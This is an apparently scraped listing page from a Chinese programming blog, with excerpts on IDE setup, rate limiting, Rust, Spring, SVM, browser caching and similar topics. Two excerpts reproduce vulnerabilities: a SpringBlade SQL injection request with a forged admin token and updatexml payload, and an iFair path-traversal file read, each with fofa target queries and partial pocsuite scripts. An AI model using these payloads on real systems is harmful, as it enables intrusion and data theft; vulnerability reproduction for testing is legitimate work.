下载并安装CLion（注意，这是一个商业软件，但提供试用版）。启动CLion并创建一个新的项目。在项目中添加一个C++源文件。编写你的代码。使用CLion的构建和运行按钮来编译和运行你的程序。 注意事项 在使用IDE之前，确保你的计算机上已经安装了C++编译器，如GCC或Clang。某些IDE，如Visual Studio for Windows，会在安装时包含它们自己的编译器。IDE通常会为你的程序创建构建系统（如Makefile或CMakeLists.txt），这样你就不需要手动编译程序。IDE提供了很多便利，如代码高亮、自动完成、错误提示、代码跳转、智能重构和版本控制集成等。不同的IDE有不同的用户界面和功能集，你可能需要花些时间来适应你选择的IDE。 通过完成第三课，你应该熟悉如何在一个IDE中设置和管理C++项目，以及如何利用IDE提供的工具来编写、编译和运行C++程序。这将为你提供一个更加集成和高效的开发环境，让你可以专注于编码而不是配置。
使用vs code例子 1.插件安装
c语言支持插件
代码运行插件
2.新建.cpp 文件
3.运行
双击页面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f879b44bb219fd73b6c205cdccbcc3d5/" rel="bookmark">
			分布式环境下流控技术汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇主要是对分布式环境流控技术、原理、使用场景做个简要的汇总，包括：固定时间窗口算法，滑动时间窗口算法，漏桶算法，令牌桶算法，分布式消息中间件，流控与熔断利器Sentinel。
1. 前言 在流量控制系列文章中的前六篇，分别介绍了固定时间窗口算法、滑动时间窗口算法、漏桶原理、令牌桶、消息中间件、Sentinel如何应用到分布式环境下的流量与并发控制。
这里再次对这几个做一个简单回顾，知道工具箱里面的不同工具的特性，才能更好更快地干活。
2. 固定时间窗口算法 固定窗口：算法简单，对突然流量响应不够灵活。超过流量的会直接拒绝，通常用于限流。
详见：《精确掌控并发：固定时间窗口算法在分布式环境下并发流量控制的设计与实现》
3. 滑动时间窗口算法 滑动窗口： 算法简单，对突然流量响应比固定窗口灵活。超过流量的会直接拒绝，通常用于限流。
详见：《精确掌控并发：滑动时间窗口算法在分布式环境下并发流量控制的设计与实现》
4. 漏桶算法 漏桶算法：在固定窗口的基础之上，使用队列缓冲流量。提供了稳定的流量输出，适用于对流量平滑性有严格要求的场景。
详见：《精确掌控并发：漏桶算法在分布式环境下并发流量控制的设计与实现》
5. 令牌桶算法 令牌桶算法：在滑动窗口的基础之上，使用队列缓冲流量。提供了稳定的流量输出，且能应对突发流量。
详见：《精确掌控并发：令牌桶算法在分布式环境下并发流量控制的设计与实现》
6. 分布式消息中间件 分布式消息中间件：在支付场景的削峰填谷用得比较多，且对精度没有那么苛刻的场景。以及应用间的解耦。
详见：《削峰填谷与应用间解耦：分布式消息中间件在分布式环境下并发流量控制的应用》
7. 流控与熔断利器Sentinel Sentinel：分布式场景下的流量控制和熔断机制利器。
详见：《流量控制与熔断利器：Sentinel介绍》
8. 方案选型 限流和熔断保护：Sentinel。
削峰填谷和应用间解耦：消息中间件。
极低并发要求：自己使用redis实现漏桶或令牌桶。
想手撸一段代码测试：固定时间窗口和滑动时间窗口。
实际上，自己实现的固定时间窗口或滑动时间窗口，还可以加上一些其它技术，解决一些其它的问题，比如渠道自动开关。这个后面单独开文章介绍。
9. 结束语 这7篇文章对流控的原理、实现方案、应用场景分别做了详细的描述，应对绝大部分的支付系统，是绰绰有余的。哪怕中国TOP2的支付公司，内部的使用也差不多是这样，只是部署集群的规模更大，对稳定性的要求更高，对应地附加了很多其它保障手段。
这是《百图解码支付系统设计与实现》专栏系列文章中的第（20）篇，也是流量控制系列的第（7）篇。点击上方关注，深入了解支付系统的方方面面。
10.精选 专栏地址：百图解码支付系统设计与实现
《百图解码支付系统设计与实现》专栏介绍
《百图解码支付系统设计与实现》专栏大纲及文章链接汇总（进度更新于2023.1.15）
领域相关（部分）：
支付行业黑话：支付系统必知术语一网打尽
跟着图走，学支付：在线支付系统设计的图解教程
图解收单平台：打造商户收款的高效之道
图解结算平台：准确高效给商户结款
图解收银台：支付系统承上启下的关键应用
图解支付引擎：资产流动的枢纽
图解渠道网关：不只是对接渠道的接口（一）
技术专题（部分）：
交易流水号的艺术：掌握支付系统的业务ID生成指南
揭密支付安全：为什么你的交易无法被篡改
金融密语：揭秘支付系统的加解密艺术
支付系统日志设计完全指南：构建高效监控和问题排查体系的关键基石
避免重复扣款：分布式支付系统的幂等性原理与实践
支付系统的心脏：简洁而精妙的状态机设计与核心代码实现
精确掌控并发：固定时间窗口算法在分布式环境下并发流量控制的设计与实现
精确掌控并发：滑动时间窗口算法在分布式环境下并发流量控制的设计与实现
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e60857d61c1d1a49f002581586f53aa8/" rel="bookmark">
			增加CO气体报警、氢气报警以及烟雾报警
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标题：增加CO气体报警、氢气报警以及烟雾报警。
内容：通过ADC采集通道，实现传感器电压的采集，通过对电压进行判断是否报警，（理论上应该可以计算出气体浓度，通过气体浓度来判断是否报警）。
1、气体报警的原理 气体报警采用的是分压电路，在基本检测电路中，VC是固定电压1.8V，Rm为固定20kΩ，当气体浓度变化是，电阻Rs的阻值会发生变化，从而引起电压也发生变化。在空气中的Rs的组成作为基准阻值R0，Rs/R0为计算气体浓度。目前的应用场景，需求比较简单，不需要计算详细的浓度值，只需要记录在阈值浓度的情况下的电压，当电压达到阈值电压时，发生报警提醒即可。
如需要计算气体浓度的话，就需要考虑气体灵敏度问题，如下图所示，找出对应的气体曲线，当其他达到一定的浓度发生报警。
2、气体报警代码实现逻辑 根据下图的原理图，可以发现采用ADC采样，采集电压信息，从原理图上可以看到分别用了ADC采样的ADC6、ADC5和ADC4三个通道，首先要对三个采样通道进行配置，然后采集电压数据。
在采集完成电压信号之后，就需要对采样之后的电压信号进行一个判断，主要用于判断气体报警以及气体报警恢复等。具体流程图如下：
针对浓度的计算，也是可以通过代码实现的，通过计算出来的电压，利用上述Rs的计算公式就可以计算出具体浓度。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3a9835b9eeb232077d284184e6e6ebe/" rel="bookmark">
			c&#43;&#43; 关于那些莫名其妙 “不 coredump” 的思考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多人都听过， 在某个地方删除一个 printf 的时候， 代码居然 coredump 了，
本文尝试对这些问题做一点思考。
基本代码 #include&lt;stdio.h&gt; #include&lt;string.h&gt; void pt() { long long a; // 未初始化 const char* x = "helxo"; printf("%ld %ld\n", a, &amp;a); printf("%c", x[int(a)]); } void test() { pt(); } int main() { test(); } 汇编 解释 在 pt() 内部， 我们没有对 a进行初始化， 从汇编来看，a 的值， 确实没有初始化，这时候a 的值是不确定的， 编译代码并运行， oops, coredump 了， 这个是符合预期的
怎么不 coredump 给出代码 #include&lt;stdio.h&gt; #include&lt;string.h&gt; void init2() { // 1 存储在栈中 8 个字节, 小端存储的话, 低地址存储低位 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3a9835b9eeb232077d284184e6e6ebe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/016a7d54e01b8f3ef852828726991d03/" rel="bookmark">
			【RHCSA服务搭建实验】之apache
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		虚拟web主机类型 一、基于端口 1.vim /etc/httpd/conf.d/vhost2.conf ---- — 改变http服务默认访问路径
&lt;directory /testweb1&gt; allowoverride none 表示不允许覆盖其他配置 require all granted 表示允许所有请求 &lt;/directory&gt; &lt;virtualhost 0.0.0.0:80&gt; 所有ip可以通过80端口访问 documentroot /testweb1 指定了客户端请求网页时服务器返回文件的路径 servername 192.168.85.129 服务器的域名 &lt;/virtualhost&gt; listen 81 监听81端口 &lt;directory /testweb2&gt; allowoverride none require all granted &lt;/directory&gt; &lt;virtualhost 0.0.0.0:81&gt; 所有ip可以通过81端口访问 documentroot /testweb2 servername 192.168.85.129 &lt;/virtualhost&gt; ：保存退出 2.分别在/testweb1，/testweb2目录下创建index.html文件，写入自己想要的内容
3.systemctl restart httpd --------- 修改了配置文件就需要重启该http服务
4.检查自己的防火墙是否放行http服务和81端口，如果没有就需要配置
firewall-cmd --add-service=http --permanent firewall-cmd --add-port=81/tcp --permanent firewall-cmd --reload 5.getenforce 检查一下自己是否是Permissive宽容模式，如果不是就 setenforce 0 临时开启，因为Enforcing需要验证页面标签，所以直接关了方便。
二、基于IP 1.vim /etc/httpd/conf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/016a7d54e01b8f3ef852828726991d03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f68a368a523e44fc6acd5f2039af300/" rel="bookmark">
			00-Rust前言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问：为什么要近期想学习Rust?
答： Rust出来也是有一段时间了，从Microsoft吵着要重构他们的C++"祖传代码"开始，Rust就披着“高效，安全”的头衔。而自己决定要学习Rust，是因为近期发现：涉及工作的部分开源代码也在悄然的发现变化。
例如：Google在java端用Kotlin改写原有java代码，这个没有什么意外，毕竟Kotlin是Google的亲儿子。但是，最近发现Google也在修改native层的C/C++代码了.....
源码对比： Android 12 VS Android 14 一图胜千言！ Google已经在着手用Rust来替代C/C++的相关实现。同时，听说Linux内核也在用Rust来替代C/C++相关实现...…所以，Rust要学起来！
Rust 编程语言从根本上讲是一种增强能力的语言：无论你现在正在编写哪种代码，Rust 都能让你走得更远，在比以前更广泛的领域中自信地编程。
例如，"系统级 "工作涉及内存管理、数据表示和并发的底层细节。传统上，这一编程领域被视为神秘莫测，只有少数经过多年学习才能避开其恶名昭彰的陷阱的人才能涉足。即使是那些实践者，也要小心谨慎，以防他们的代码被利用、崩溃或损坏。
Rust 打破了这些障碍，消除了旧有的陷阱，并提供了一套友好、完善的工具，帮助你一路前行。需要 "深入 "底层控制的程序员可以使用 Rust 实现这一目标，而不必承担崩溃或安全漏洞的传统风险，也不必学习善变工具链的细节。更妙的是，Rust 语言的设计会引导你自然而然地编写出可靠的代码，并提高速度和内存使用效率。
已经在使用底层代码的程序员可以使用 Rust 来提升他们的雄心壮志。例如，在 Rust 中引入并行性是一种风险相对较低的操作：编译器会帮你抓住经典错误。你可以在代码中进行更激进的优化。它的表现力和人体工程学足以让 CLI 应用程序、Web 服务器和许多其他类型的代码编写得非常愉快：你将在本书后面的章节中找到这两方面的简单示例。
使用 Rust 可以培养从一个领域转移到另一个领域的技能：你可以通过编写网络应用程序来学习 Rust，然后将这些技能用于 Raspberry Pi。
事实证明，Rust 是一种高效的工具，可用于由具备不同系统编程知识水平的开发人员组成的大型团队之间的协作。底层代码容易出现各种微妙的错误，而在大多数其他语言中，只有经验丰富的开发人员通过大量的测试和仔细的代码审查才能发现这些错误。在 Rust 中，编译器扮演着看门人的角色，拒绝编译存在这些难以捉摸的错误（包括并发错误）的代码。通过与编译器并肩作战，团队可以将时间集中在程序逻辑上，而不是追逐错误。
Rust 是专为那些渴望语言的速度和稳定性的人设计的。所谓速度，既指 Rust 代码的运行速度，也指 Rust 让你编写程序的速度。Rust 编译器的检查通过功能添加和重构来确保稳定性。与之形成鲜明对比的是，在没有这些检查的语言中，遗留代码非常脆弱，开发人员往往不敢修改。通过努力实现零成本抽象，即：高层特性编译成低层代码的速度与手动编写的代码一样快，Rust 致力于让安全代码也成为快速代码。
Rust 还为系统编程领域带来了现代开发人员工具：
Cargo 是随附的依赖关系管理器和构建工具，它能让添加、编译和管理依赖关系变得简单，并在整个 Rust 生态系统中保持一致。Rustfmt 格式化工具可确保不同开发人员的编码风格保持一致。Rust 语言服务器支持集成开发环境 (IDE) 集成，可实现代码自动补全和内联错误信息。 附： 公司和 C++ 开发人员如何向 Rust 过渡
随着软件开发的不断发展，人们开始寻求更安全、更高效的编程语言，这促使许多人开始考虑成熟的 C++ 之外的其他编程语言。Rust 注重内存安全、零成本抽象和并发性，已成为一种引人注目的选择。无论您是 C++ 开发人员，还是正在寻找更安全编程语言的公司，Rust 编程语言都能让您的技术达到新的高度。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f68a368a523e44fc6acd5f2039af300/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c7745b0215798376672d51be73e0ea2/" rel="bookmark">
			Spring的纯注解配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习目标 环境搭建新注解说明Spring的纯注解配置 1.环境搭建 1.1.创建工程 拷贝ssm工程：
1.2.待改造的问题 我们发现，之所以我们现在离不开xml配置文件，是因为我们有一处很关键的配置，如果他要也能用注解配置，那么我们就可以脱离xml文件了：
1.2.1.jdbc配置 &lt;context:property-placeholder location="classpath:db.properties"&gt; &lt;/context:property-placeholder&gt; &lt;!--数据源--&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.username}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="driverClassName" value="${jdbc.driver}" /&gt; &lt;property name="maxActive" value="10" /&gt; &lt;property name="minIdle" value="5" /&gt; &lt;/bean&gt; 1.2.2.mybatis配置 &lt;!--sqlSession工厂--&gt; &lt;bean id="sessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;property name="dataSource" ref="dataSource"&gt;&lt;/property&gt; &lt;property name="typeAliasesPackage" value="com.by.pojo"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!--配置MapperScan扫描mapper接口，并把生成的代理类交给spring去管理--&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.by.mapper"&gt;&lt;/property&gt; &lt;property name="sqlSessionFactoryBeanName" value="sessionFactoryBean"&gt;&lt;/property&gt; &lt;/bean&gt; 1.2.3.transactional配置 &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c7745b0215798376672d51be73e0ea2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ad657c9db11281398a9d4d94246bed3/" rel="bookmark">
			【本科生机器学习】【北京航空航天大学】课题报告：支持向量机（Support Vector Machine, SVM）初步研究【上、原理部分】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说明：
（1）、仅供个人学习使用；
（2）、本科生学术水平有限，故不能保证全无科学性错误，本文仅作为该领域的学习参考。
一、课程总结 1、机器学习（Machine Learning, ML）的定义 机器学习是人工智能的一个分支。人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。显然，机器学习是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。机器学习在近30多年已发展为一门多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、计算复杂性理论等多门学科。
机器学习理论主要是设计和分析一些让计算机可以自动“学习”的算法。机器学习算法是一类从数据中自动分析获得规律，并利用规律对未知数据进行预测的算法。因为学习算法中涉及了大量的统计学理论，机器学习与推断统计学联系尤为密切，也被称为统计学习理论。算法设计方面，机器学习理论关注可以实现的，行之有效的学习算法。很多推论问题属于无程序可循难度，所以部分的机器学习研究是开发容易处理的近似算法。
机器学习已广泛应用于数据挖掘、计算机视觉、自然语言处理、生物特征识别、搜索引擎、医学诊断、检测信用卡欺诈、证券市场分析、DNA序列测序、语音和手写识别、战略游戏和机器人等领域。
统计学习是关于计算机基于数据构建概率统计模型并运用模型对数据进行预测与分析的一门学科。统计学习也称为统计机器学习。
统计学习的主要特点是：
（1）、统计学习以计算机及网络为平台，是建立在计算机及网络上的；
（2）、统计学习以数据为研究对象，是数据驱动的学科；
（3）、统计学习的目的是对数据进行预测与分析；
（4）、统计学习以方法为中心，统计学习方法构建模型并应用模型进行预测与分析；
（5）、统计学习是概率论、统计学、信息论、计算理论、最优化理论及计算机科学等多个领域的交叉学科，并且在发展中逐步形成独自的理论体系与方法论。
2、本课程主要内容 略。(参见下文中的算法描述部分。）
二、问题介绍 1、问题描述： （1）、 使用逻辑回归分类器和支持向量机，根据鸢尾花的特征，在鸢尾花数据集上进行分类任务；
（2）、 使用多项式特征的SVM分类器，对卫星形（Moon-shaped）数据集进行分类。
（3）、 使用SVM回归模型，对随机线性数据拟合最优直线。
2、原始数据： （1）、 鸢尾植物数据集。这个数据集中共有150朵鸢尾花的图片，分别来自三个不同品种（山鸢尾（Iris Setosa）、变色鸢尾（Iris Versicolor）和维吉尼亚鸢尾（Iris Virginica）），数据条目里包含花的萼片以及花瓣的长度和宽度（见图1）。
图1.三种不同品种的鸢尾花
鸢尾植物数据集的键（keys）分别为：
['data', 'target', 'frame', 'target_names', 'DESCR', 'feature_names', 'filename'] 其中 ‘target’ 字段指示鸢尾花的品种，取值为0,1,2. 若target = 0, 说明为山鸢尾(Iris Setosa)；若target = 1, 说明为变色鸢尾(Iris Versicolor)；若target = 2, 说明为维吉尼亚鸢尾(Iris Virginica)。
（2）、 卫星数据集。卫星数据集（Moon-shaped Dataset）是一种用于二元分类的小型数据集，其中数据点所组成的形状为两个相互交织的半圆型。Python中的 make_moons() 函数用来生成该数据集，便于在数据集上进行分类测试。make_moons() 函数生成的数据集如下图所示：
图2. make_moons()函数生成的数据集举例
（3）、 为了训练线性SVM回归模型，使用随机生成的线性数据集作为训练集。该数据集由100个样本点所构成，具有单一特征x1，并且添加了高斯白噪声。拟合成的直线方程为y=3x+4. 此数据集的形状如下图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ad657c9db11281398a9d4d94246bed3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7c8f50ff616ab50e7c7b0ec55788661/" rel="bookmark">
			sonarqube的质量配置 quality profiles
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. quality profiles是什么？ 1.1 官网定义 看上去就是包含了一系列rules的配置文件，用于代码分析。
每个项目都有quality profile集合，当代码分析的时候，项目中的每个语言都会找到激活的quality profile用于代码分析。
例如下面的这张图，就会使用test-name分析java代码，用实例默认分析xml代码
2. quality profiles的CRUD 来到quality profiles的API文档 2.1 导出配置 GET api/qualityprofiles/backup 之前版本的sonarqube有一个backUp按钮，用于下载配置，但是现在的版本内置的Sonar way没看到下载的按钮！Why？？
既然没有了这个按钮，那就用api导出默认的配置吧： GET api/qualityprofiles/backup  ~/data/sonar/sonarqube/data/  ~/data/sonar/sonarqube/data/ curl -u admin:admin123! http://localhost:9000/api/qualityprofiles/backup\?language\=java\&amp;qualityProfile\=Sonar%20way &gt; sonar_way.xml % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 62409 0 62409 0 0 270k 0 --:--:-- --:--:-- --:--:-- 270k  ~/data/sonar/sonarqube/data/  ~/data/sonar/sonarqube/data/ quality profiles文件的内容 key是一个规则，暂时还不懂。。。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7c8f50ff616ab50e7c7b0ec55788661/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a6d854167233bed837f6dbda607bfad/" rel="bookmark">
			GIS项目实战07：Eclipse资源分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网下载：Eclipse Downloads | The Eclipse Foundation
百度网盘分享：
链接：https://pan.baidu.com/s/1YBKw8k0a0DouSWZmDg8fYw 提取码：1234 （链接失效请私信）
无需安装，解压即可使用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1838c28e4cea7cf6ec3567a3748f7f55/" rel="bookmark">
			漏洞复现-SpringBlade export-user SQL 注入漏洞（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 该系统/api/blade-user/export-user接口存在SQL注入漏洞，会造成数据泄露。
fofa语句 body="https://bladex.vip" poc加检测 GET /api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&amp;account&amp;realName&amp;1-updatexml(1,concat(0x7e,md5(102103122),0x7e),1)=1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 poc脚本 脚本使用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2024/1/21 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD, random_str class springboot_apiblade_sql(POCBase): pocDesc = '''SpringBlade export-user SQL 注入漏洞''' author = '炼金术师诸葛亮' createDate = '2024-1-21' name = 'SpringBlade export-user SQL 注入漏洞' def _verify(self): result = {} url = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1838c28e4cea7cf6ec3567a3748f7f55/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6427f4fc633c2b7e705fa81fed1b15f/" rel="bookmark">
			浏览器缓存（Service Worker、Memory Cache、disk Cache、强缓存、协商缓存、Ctr F5、Disable Cache、强缓存假象）详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
浏览器缓存
缓存种类
Service Worker
Memory Cache
preloader
disk cache
添加缓存位置流程 强制缓存 (强缓存)
Expires
Cache-control 协商缓存（对比缓存）
Etag作用
Pragma
协商缓存使用注意
缓存标志优先级
请求流程
浏览器操作对缓存的影响
Ctr F5（硬性重新加载、强制刷新）
Disable cache
Ctr Shift Delete
强缓存假象
缓存案例
浏览器缓存 浏览器在本地磁盘对用户最近请求过的文档（文件）进行存储（缓存），以便在下一次访问时重复使用，即当访问者再次访问同一页面时，浏览器就可以直接从本地磁盘加载文档，从而节省带宽、提升访问速度、降低服务器压力。
缓存种类 浏览器缓存按位置分类有3种，它们的优先级是：(由上到下寻找，找到即返回；找不到则继续)
Service WorkerMemory CacheDisk Cache网络请求 我们可以在 Chrome 的开发者工具中F12，Network -&gt; Size 一列看到一个请求最终的处理方式：如果是大小 (多少 K， 多少 M 等) 就表示是网络请求，否则会列出 from memory cache, from disk cache 和 from ServiceWorker。
按缓存方式分类有2种
1.强制缓存（强缓存）
2.协商缓存 （对比缓存）
Service Worker 一种在浏览器后台运行的JavaScript脚本，它可以拦截和处理网页发出的网络请求，以及管理缓存和离线数据。Service Worker可以让网页在离线状态下仍能正常访问，并且可以提高网页的性能和响应速度。它由开发者编写的额外的脚本控制，且缓存位置独立。
可以在 F12 中的Application下看到
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6427f4fc633c2b7e705fa81fed1b15f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09bc27a370a78baa197521ec0e80cf1a/" rel="bookmark">
			漏洞复现-企语iFair协同管理系统getuploadimage.jsp接口任意文件读取漏洞（附带漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 企语iFair协同管理系统同时兼容了Linux、Windows两种操作系统，用户可以根据自己需求进行安装使用。fuwushe.org iFair 版本 23.8_ad0 及之前版本中的目录遍历漏洞允许攻击者通过精心设计的脚本获取敏感信息。iFair 23.8_ad0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的脚本获取敏感信息。
fofa语句 app="服务社-企语iFair" poc加检测 poc脚本 脚本使用pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2024/1/21 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD, random_str class ifair_fileread(POCBase): pocDesc = '''企语iFair协同管理系统getuploadimage.jsp接口存在任意文件读取''' author = '炼金术师诸葛亮' createDate = '2024-1-21' name = '企语iFair协同管理系统getuploadimage.jsp接口任意文件读取漏洞' def _verify(self): result = {} url = self.url+ '/oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%001.png' headers = { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09bc27a370a78baa197521ec0e80cf1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0dfb1884745aaa8df6cdabb66bb5f47/" rel="bookmark">
			基于springboot的在线学习平台系统设计（源码&#43;文档）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、整体目录（示范）：
文档含项目技术介绍、E-R图、数据字典、项目功能介绍与截图等
二、运行截图
三、代码部分（示范）：
四、数据库表(示范)：
数据库表有注释，可以导出数据字典及更新数据库时间，欢迎交流学习
五、主要技术介绍：
六、项目调试学习（点击查看）
七、项目交流
课题背景：
随着互联网的普及和在线教育的兴起，越来越多的学习者开始寻求线上学习的机会。传统的线下学习方式已无法满足日益增长的学习需求，因此，一个功能强大、用户友好的在线学习平台成为了市场的迫切需求。基于Spring Boot的在线学习平台系统设计正是基于这样的背景而展开。
目的与意义：
满足学习需求：随着终身学习理念的深入人心，人们对学习的需求更加多样化。基于Spring Boot的在线学习平台可以提供各种课程和学习资源，满足不同人群的学习需求。提高学习效率：该平台通过在线视频、音频、互动讨论等功能，为学习者提供一个沉浸式的学习环境，从而提高学习效率。降低学习成本：与传统线下学习相比，在线学习可以大大降低场地租赁、设备购置等成本，使学习更加经济实惠。促进教育公平：无论学习者身处何地，只要有互联网接入，都可以通过该平台获取优质的教育资源。这有助于缩小地域之间的教育差距，促进教育公平。简化管理流程：通过系统设计，可以实现自动化、智能化的学生管理、课程管理等功能，大大简化了管理流程，提高了管理效率。数据驱动决策：通过收集和分析用户的学习数据，可以为教学决策提供有力的支持，进一步优化教学质量。 综上所述，基于Spring Boot的在线学习平台系统设计不仅有助于满足日益增长的学习需求，提高学习效率，降低学习成本，还有助于促进教育公平和管理简化。这不仅具有深远的经济意义，更具有广泛的社会意义。
一、整体目录（示范）： 文档含项目技术介绍、E-R图、数据字典、项目功能介绍与截图等 二、运行截图 三、代码部分（示范）： 注册较验代码：
// 注册 async register() { if((!this.ruleForm.yonghuzhanghao) &amp;&amp; `yonghu` == this.tableName){ this.$utils.msg(`用户账号不能为空`); return } if(`yonghu` == this.tableName &amp;&amp; (this.ruleForm.yonghuzhanghao.length&lt;8)){ this.$utils.msg(`用户账号长度不能小于8`); return } if(`yonghu` == this.tableName &amp;&amp; (this.ruleForm.yonghuzhanghao.length&gt;12)){ this.$utils.msg(`用户账号长度不能大于12`); return } if((!this.ruleForm.mima) &amp;&amp; `yonghu` == this.tableName){ this.$utils.msg(`密码不能为空`); return } if(`yonghu` == this.tableName &amp;&amp; (this.ruleForm.mima!=this.ruleForm.mima2)){ this.$utils.msg(`两次密码输入不一致`); return } if((!this.ruleForm.yonghuxingming) &amp;&amp; `yonghu` == this.
	</div>
